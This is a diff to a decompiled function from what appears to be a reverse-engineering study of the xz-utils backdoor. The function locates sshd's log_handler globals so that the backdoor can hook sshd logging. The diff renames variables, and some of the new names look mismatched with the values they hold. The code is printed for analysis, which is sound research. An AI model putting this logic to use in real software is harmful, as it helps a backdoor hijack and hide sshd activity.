@@ -5,7 +5,12 @@
 
 
 /*
- * AutoDoc: Walks the sshd code that assigns log_handler and log_handler_ctx to confirm a pair of addresses really correspond to those globals. Stage two performs this validation before patching the slots so the mm_log_handler hook does not corrupt unrelated memory.
+ * AutoDoc: Replays sshd's code that writes `log_handler` and `log_handler_ctx`: starting from the
+ * string-reference index for the logging functions it walks forward, verifies the LEA that
+ * materialises the handler storage, re-identifies the function via `find_function`, and then
+ * confirms that both candidate pointers are written via MOV [mem],reg instructions in that
+ * window. Only when both stores are observed does it accept the pair as the real
+ * log_handler/log_handler_ctx slots.
  */
 #include "xzre_types.h"
 
@@ -20,14 +25,19 @@ BOOL validate_log_handler_pointers
   long lVar2;
   u8 *puVar3;
   u8 **ppuVar4;
-  u8 *code_end_00;
-  u8 *local_88;
-  u8 *local_80;
-  u64 local_78;
-  int local_58;
-  u64 local_48;
+  u64 branch_disp;
+  int opcode;
+  u64 insn_size;
+  void *log_handler_slot;
+  long gap;
+  u8 *insn_ptr;
+  u8 **scan_ctx;
+  u8 *block_end;
+  u8 *function_end;
+  BOOL scan_success;
+  u8 *dasm_ip;
   
-  ppuVar4 = &local_80;
+  ppuVar4 = &block_end;
   for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
     *(undefined4 *)ppuVar4 = 0;
     ppuVar4 = (u8 **)((long)ppuVar4 + 4);
@@ -40,24 +50,24 @@ BOOL validate_log_handler_pointers
     if (((lVar2 < 0x10) &&
         (mem_address = refs->entries[0x13].func_start, mem_address != (void *)0x0)) &&
        (puVar3 = (u8 *)refs->entries[0x14].func_start, puVar3 != (u8 *)0x0)) {
-      code_end_00 = (u8 *)refs->entries[0x14].func_end;
+      ppuVar4 = (u8 **)refs->entries[0x14].func_end;
       BVar1 = find_lea_instruction_with_mem_operand
-                        (puVar3,code_end_00,(dasm_ctx_t *)&local_80,mem_address);
-      puVar3 = local_80;
+                        (puVar3,(u8 *)ppuVar4,(dasm_ctx_t *)&block_end,mem_address);
+      puVar3 = block_end;
       if (BVar1 != 0) {
-        BVar1 = x86_dasm((dasm_ctx_t *)&local_80,local_80 + local_78,code_end_00);
-        if ((BVar1 != 0) && (local_58 == 0x168)) {
-          local_88 = (u8 *)0x0;
-          puVar3 = local_80 + local_78 + local_48;
-          find_function(puVar3,(void **)0x0,&local_88,(u8 *)search_base,code_end,
+        BVar1 = x86_dasm((dasm_ctx_t *)&block_end,function_end + (long)block_end,(u8 *)ppuVar4);
+        if ((BVar1 != 0) && (scan_success == 0x168)) {
+          scan_ctx = (u8 **)0x0;
+          puVar3 = function_end + (long)dasm_ip + (long)block_end;
+          find_function(puVar3,(void **)0x0,&scan_ctx,(u8 *)search_base,code_end,
                         global->uses_endbr64);
-          code_end_00 = local_88;
+          ppuVar4 = scan_ctx;
         }
         BVar1 = find_instruction_with_mem_operand_ex
-                          (puVar3,code_end_00,(dasm_ctx_t *)0x0,0x109,addr1);
+                          (puVar3,(u8 *)ppuVar4,(dasm_ctx_t *)0x0,0x109,addr1);
         if (BVar1 != 0) {
           BVar1 = find_instruction_with_mem_operand_ex
-                            (puVar3,code_end_00,(dasm_ctx_t *)0x0,0x109,addr2);
+                            (puVar3,(u8 *)ppuVar4,(dasm_ctx_t *)0x0,0x109,addr2);
           return (uint)(BVar1 != 0);
         }
       }
